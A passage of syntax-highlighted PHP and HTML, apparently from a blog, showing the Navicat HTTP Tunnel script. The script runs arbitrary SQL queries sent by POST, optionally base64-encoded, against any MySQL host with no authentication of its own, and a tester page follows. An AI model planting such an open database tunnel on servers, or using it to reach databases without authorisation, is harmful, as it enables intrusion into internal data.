class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">////</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">40005</span>) &#123;</span><br><span class="line">		EchoHeader(<span class="number">201</span>);</span><br><span class="line">		<span class="keyword">echo</span> GetBlock(<span class="string">&quot;unsupported php version&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">40010</span>) &#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$HTTP_POST_VARS</span>;</span><br><span class="line">		<span class="variable">$_POST</span> = &amp;<span class="variable">$HTTP_POST_VARS</span>;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;host&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>])) &#123;</span><br><span class="line">		<span class="variable">$testMenu</span> = <span class="variable">$allowTestMenu</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$testMenu</span>)&#123;</span><br><span class="line">			EchoHeader(<span class="number">202</span>);</span><br><span class="line">			<span class="keyword">echo</span> GetBlock(<span class="string">&quot;invalid parameters&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$testMenu</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;encodeBase64&quot;</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>]);<span class="variable">$i</span>++)</span><br><span class="line">				<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>] = base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!function_exists(<span class="string">&quot;mysql_connect&quot;</span>) &amp;&amp; !function_exists(<span class="string">&quot;mysqli_connect&quot;</span>)) &#123;</span><br><span class="line">			EchoHeader(<span class="number">203</span>);</span><br><span class="line">			<span class="keyword">echo</span> GetBlock(<span class="string">&quot;MySQL not supported on the server&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$errno_c</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$hs</span> = <span class="variable">$_POST</span>[<span class="string">&quot;host&quot;</span>];</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$use_mysqli</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>] )</span><br><span class="line">				<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$hs</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>], <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>], <span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>]);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$hs</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>], <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">			<span class="variable">$errno_c</span> = mysqli_connect_errno(<span class="variable">$conn</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$errno_c</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				EchoHeader(<span class="variable">$errno_c</span>);</span><br><span class="line">				<span class="keyword">echo</span> GetBlock(mysqli_connect_error(<span class="variable">$conn</span>));</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>((<span class="variable">$errno_c</span> &lt;= <span class="number">0</span>) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>] != <span class="string">&quot;&quot;</span> )) &#123;</span><br><span class="line">				<span class="variable">$res</span> = mysqli_select_db(<span class="variable">$conn</span>, <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>] );</span><br><span class="line">				<span class="variable">$errno_c</span> = mysqli_errno(<span class="variable">$conn</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			EchoHeader(<span class="variable">$errno_c</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$errno_c</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> GetBlock(mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;C&quot;</span>) &#123;</span><br><span class="line">				EchoConnInfo(<span class="variable">$conn</span>);</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;Q&quot;</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>]);<span class="variable">$i</span>++) &#123;</span><br><span class="line">					<span class="variable">$query</span> = <span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>];</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$query</span> == <span class="string">&quot;&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">50400</span>)&#123;  </span><br><span class="line">						<span class="keyword">if</span>(get_magic_quotes_gpc())</span><br><span class="line">							<span class="variable">$query</span> = stripslashes(<span class="variable">$query</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line">					<span class="variable">$errno</span> = mysqli_errno(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$affectedrows</span> = mysqli_affected_rows(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$insertid</span> = mysqli_insert_id(<span class="variable">$conn</span>);				</span><br><span class="line">					<span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$res</span>) &#123;</span><br><span class="line">						<span class="variable">$numfields</span> = mysqli_field_count(<span class="variable">$conn</span>);</span><br><span class="line">						<span class="variable">$numrows</span> = mysqli_num_rows(<span class="variable">$res</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="variable">$numfields</span> = <span class="number">0</span>;</span><br><span class="line">						<span class="variable">$numrows</span> = <span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					EchoResultSetHeader(<span class="variable">$errno</span>, <span class="variable">$affectedrows</span>, <span class="variable">$insertid</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$errno</span> &gt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">echo</span> GetBlock(mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$numfields</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">							EchoFieldsHeader(<span class="variable">$res</span>, <span class="variable">$numfields</span>);</span><br><span class="line">							EchoData(<span class="variable">$res</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="keyword">if</span>(phpversion_int() &gt;= <span class="number">40300</span>)</span><br><span class="line">								<span class="keyword">echo</span> GetBlock(mysqli_info(<span class="variable">$conn</span>));</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">								<span class="keyword">echo</span> GetBlock(<span class="string">&quot;&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$i</span>&lt;(count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>])-<span class="number">1</span>))</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x01&quot;</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">					<span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$res</span>)</span><br><span class="line">						mysqli_free_result(<span class="variable">$res</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>] ) <span class="variable">$hs</span> .= <span class="string">&quot;:&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>];</span><br><span class="line">			<span class="variable">$conn</span> = mysql_connect(<span class="variable">$hs</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>], <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">			<span class="variable">$errno_c</span> = mysql_errno();</span><br><span class="line">			<span class="comment">//if (phpversion_int() &gt;= 50203)&#123;  // for unicode database name</span></span><br><span class="line">			<span class="comment">//	mysql_set_charset(&#x27;UTF8&#x27;);</span></span><br><span class="line">			<span class="comment">//&#125;</span></span><br><span class="line">			<span class="keyword">if</span>((<span class="variable">$errno_c</span> &lt;= <span class="number">0</span>) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>] != <span class="string">&quot;&quot;</span> )) &#123;</span><br><span class="line">				<span class="variable">$res</span> = mysql_select_db( <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>], <span class="variable">$conn</span>);</span><br><span class="line">				<span class="variable">$errno_c</span> = mysql_errno();</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			EchoHeader(<span class="variable">$errno_c</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$errno_c</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> GetBlock(mysql_error());</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;C&quot;</span>) &#123;</span><br><span class="line">				EchoConnInfo(<span class="variable">$conn</span>);</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;Q&quot;</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>]);<span class="variable">$i</span>++) &#123;</span><br><span class="line">					<span class="variable">$query</span> = <span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>];</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$query</span> == <span class="string">&quot;&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">50400</span>)&#123;  </span><br><span class="line">						<span class="keyword">if</span>(get_magic_quotes_gpc())</span><br><span class="line">							<span class="variable">$query</span> = stripslashes(<span class="variable">$query</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="variable">$res</span> = mysql_query(<span class="variable">$query</span>, <span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$errno</span> = mysql_errno();</span><br><span class="line">					<span class="variable">$affectedrows</span> = mysql_affected_rows(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$insertid</span> = mysql_insert_id(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$numfields</span> = mysql_num_fields(<span class="variable">$res</span>);</span><br><span class="line">					<span class="variable">$numrows</span> = mysql_num_rows(<span class="variable">$res</span>);</span><br><span class="line">					EchoResultSetHeader(<span class="variable">$errno</span>, <span class="variable">$affectedrows</span>, <span class="variable">$insertid</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$errno</span> &gt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">echo</span> GetBlock(mysql_error());</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$numfields</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">							EchoFieldsHeader(<span class="variable">$res</span>, <span class="variable">$numfields</span>);</span><br><span class="line">							EchoData(<span class="variable">$res</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="keyword">if</span>(phpversion_int() &gt;= <span class="number">40300</span>)</span><br><span class="line">								<span class="keyword">echo</span> GetBlock(mysql_info(<span class="variable">$conn</span>));</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">								<span class="keyword">echo</span> GetBlock(<span class="string">&quot;&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$i</span>&lt;(count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>])-<span class="number">1</span>))</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x01&quot;</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">					mysql_free_result(<span class="variable">$res</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&quot;Content-Type: text/html&quot;</span>);</span><br><span class="line"><span class="comment">////</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Navicat HTTP Tunnel Tester&lt;/title&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=ISO-8859-1&quot;</span>&gt;</span><br><span class="line">	&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">		body&#123;</span><br><span class="line">			margin: <span class="number">30</span>px;</span><br><span class="line">			font-family: Tahoma;</span><br><span class="line">			font-weight: normal;</span><br><span class="line">			font-size: <span class="number">14</span>px;</span><br><span class="line">			color: <span class="comment">#222222;</span></span><br><span class="line">		&#125;</span><br><span class="line">		table&#123;</span><br><span class="line">			width: <span class="number">100</span>%;</span><br><span class="line">			border: <span class="number">0</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		input&#123;</span><br><span class="line">			font-family:Tahoma,sans-serif;</span><br><span class="line">			border-style:solid;</span><br><span class="line">			border-color:<span class="comment">#666666;</span></span><br><span class="line">			border-width:<span class="number">1</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		fieldset&#123;</span><br><span class="line">			border-style:solid;</span><br><span class="line">			border-color:<span class="comment">#666666;</span></span><br><span class="line">			border-width:<span class="number">1</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		.Title1&#123;</span><br><span class="line">			font-size: <span class="number">30</span>px;</span><br><span class="line">			color: <span class="comment">#003366;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.Title2&#123;</span><br><span class="line">			font-size: <span class="number">10</span>px;</span><br><span class="line">			color: <span class="comment">#999966;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.TestDesc&#123;</span><br><span class="line">			width:<span class="number">70</span>%</span><br><span class="line">		&#125;</span><br><span class="line">		.TestSucc&#123;</span><br><span class="line">			color: <span class="comment">#00BB00;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.TestFail&#123;</span><br><span class="line">			color: <span class="comment">#DD0000;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.mysql&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		.pgsql&#123;</span><br><span class="line">			display:none;</span><br><span class="line">		&#125;</span><br><span class="line">		.sqlite&#123;</span><br><span class="line">			display:none;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#page&#123;</span></span><br><span class="line">			max-width: <span class="number">42</span>em;</span><br><span class="line">			min-width: <span class="number">36</span>em;</span><br><span class="line">			border-width: <span class="number">0</span>px;</span><br><span class="line">			margin: auto auto;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#host, #dbfile&#123;</span></span><br><span class="line">			width: <span class="number">300</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#port&#123;</span></span><br><span class="line">			width: <span class="number">75</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#login, #password, #db&#123;</span></span><br><span class="line">			width: <span class="number">150</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#Copyright&#123;</span></span><br><span class="line">			text-align: right;</span><br><span class="line">			font-size: <span class="number">10</span>px;</span><br><span class="line">			color: <span class="comment">#888888;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">	&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getInternetExplorerVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> ver = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (navigator.appName == <span class="string">&quot;Microsoft Internet Explorer&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">var</span> regex = <span class="keyword">new</span> RegExp(<span class="string">&quot;MSIE ([0-9]&#123;1,&#125;[\.0-9]&#123;0,&#125;)&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (regex.exec(navigator.userAgent))</span><br><span class="line">				ver = parseFloat(RegExp.$<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ver;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setText</span>(<span class="params">element, text, succ</span>)</span>&#123;</span><br><span class="line">		element.className = (succ)?<span class="string">&quot;TestSucc&quot;</span>:<span class="string">&quot;TestFail&quot;</span>;</span><br><span class="line">		element.innerHTML = text;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getByteAt</span>(<span class="params">str, offset</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> str.charCodeAt(offset) &amp; <span class="number">0xff</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getIntAt</span>(<span class="params">binStr, offset</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (getByteAt(binStr, offset) &lt;&lt; <span class="number">24</span>)+</span><br><span class="line">			(getByteAt(binStr, offset+<span class="number">1</span>) &lt;&lt; <span class="number">16</span>)+</span><br><span class="line">			(getByteAt(binStr, offset+<span class="number">2</span>) &lt;&lt; <span class="number">8</span>)+</span><br><span class="line">			(getByteAt(binStr, offset+<span class="number">3</span>) &gt;&gt;&gt; <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getBlockStr</span>(<span class="params">binStr, offset</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (getByteAt(binStr, offset) &lt; <span class="number">254</span>)</span><br><span class="line">			<span class="keyword">return</span> binStr.substring(offset+<span class="number">1</span>, offset+<span class="number">1</span>+binStr.charCodeAt(offset));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> binStr.substring(offset+<span class="number">5</span>, offset+<span class="number">5</span>+getIntAt(binStr, offset+<span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doServerTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> version = getInternetExplorerVersion();</span><br><span class="line">		<span class="keyword">if</span> (version==-<span class="number">1</span> || version&gt;=<span class="number">9.0</span>)&#123;</span><br><span class="line">			<span class="keyword">var</span> xmlhttp = (window.XMLHttpRequest)? <span class="keyword">new</span> XMLHttpRequest() : xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">			</span><br><span class="line">			xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> outputDiv = document.getElementById(<span class="string">&quot;ServerTest&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span> (xmlhttp.status == <span class="number">200</span>)&#123;</span><br><span class="line">						<span class="keyword">var</span> errno = getIntAt(xmlhttp.responseText, <span class="number">6</span>);</span><br><span class="line">						<span class="keyword">if</span> (errno == <span class="number">0</span>)</span><br><span class="line">							setText(outputDiv, <span class="string">&quot;Connection Success!&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							setText(outputDiv, parseInt(errno)+<span class="string">&quot; - &quot;</span>+getBlockStr(xmlhttp.responseText, <span class="number">16</span>), <span class="literal">false</span>);</span><br><span class="line">					&#125;<span class="keyword">else</span></span><br><span class="line">						setText(outputDiv, <span class="string">&quot;HTTP Error - &quot;</span>+xmlhttp.status, <span class="literal">false</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">var</span> params = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			<span class="keyword">var</span> form = document.getElementById(<span class="string">&quot;TestServerForm&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;form.elements.length; i++)&#123;</span><br><span class="line">				<span class="keyword">if</span> (i&gt;<span class="number">0</span>) params += <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">				params += form.elements[i].id+<span class="string">&quot;=&quot;</span>+form.elements[i].value.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%26&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).className = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).innerHTML = <span class="string">&quot;Connecting...&quot;</span>;</span><br><span class="line">			xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">			xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">			xmlhttp.setRequestHeader(<span class="string">&quot;Content-length&quot;</span>, params.length);</span><br><span class="line">			xmlhttp.setRequestHeader(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">			xmlhttp.send(params);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).className = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).innerHTML = <span class="string">&quot;Internet Explorer &quot;</span>+version+<span class="string">&quot; is not supported, please use Internet explorer 9.0 or above, firefox, chrome or safari&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;page&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">	&lt;font <span class="class"><span class="keyword">class</span>=&quot;<span class="title">Title1</span>&quot;&gt;<span class="title">Navicat</span>&amp;<span class="title">trade</span>;&lt;/<span class="title">font</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">font</span> <span class="title">class</span>=&quot;<span class="title">Title2</span>&quot;&gt;<span class="title">The</span> <span class="title">gateway</span> <span class="title">to</span> <span class="title">your</span> <span class="title">database</span>!&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">legend</span>&gt;<span class="title">System</span> <span class="title">Environment</span> <span class="title">Test</span>&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">style</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> &quot;<span class="title">display</span>:<span class="title">none</span>&quot;; ?&gt;&quot;&gt;&lt;<span class="title">td</span> <span class="title">width</span>=70%&gt;<span class="title">PHP</span> <span class="title">installed</span> <span class="title">properly</span>&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span> <span class="title">class</span>=&quot;<span class="title">TestFail</span>&quot;&gt;<span class="title">No</span>&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">doSystemTest</span>();?&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">legend</span>&gt;<span class="title">Server</span> <span class="title">Test</span>&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">TestServerForm</span>&quot; <span class="title">action</span>=&quot;#&quot; <span class="title">onSubmit</span>=&quot;<span class="title">return</span> <span class="title">false</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">hidden</span> <span class="title">id</span>=&quot;<span class="title">actn</span>&quot; <span class="title">value</span>=&quot;<span class="title">C</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span> <span class="title">width</span>=&quot;35%&quot;&gt;<span class="title">Hostname</span>/<span class="title">IP</span> <span class="title">Address</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">host</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">localhost</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Port</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">port</span>&quot; <span class="title">placeholder</span>=&quot;3306&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">pgsql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Initial</span> <span class="title">Database</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">db</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">template1</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span 